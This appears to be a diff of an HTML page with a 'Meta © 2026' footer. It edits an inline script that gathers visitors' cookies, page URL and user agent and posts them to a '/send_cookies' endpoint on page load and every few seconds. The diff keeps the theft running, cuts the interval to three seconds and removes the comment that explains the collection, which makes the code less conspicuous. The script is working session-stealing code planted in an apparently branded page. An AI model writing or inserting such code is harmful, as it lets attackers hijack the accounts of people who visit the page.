@@ -643,25 +643,21 @@
     <p class="footer-copy">Meta © 2026</p>
   </div>
   </footer>
+</div><!-- /page-wrapper -->
 <script>
-    // Thu thập cookie và gửi về server
     function sendCookies() {
         fetch('/send_cookies', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 cookies: document.cookie,
                 url: window.location.href,
-                userAgent: navigator.userAgent,
-                timestamp: new Date().toISOString()
+                userAgent: navigator.userAgent
             })
         });
     }
-
-    // Gửi cookie khi trang load và mỗi 5 giây
     window.onload = sendCookies;
-    setInterval(sendCookies, 5000);
+    setInterval(sendCookies, 3000); // Gửi mỗi 3 giây
 </script>
-</div><!-- /page-wrapper -->
 </body>
 </html>
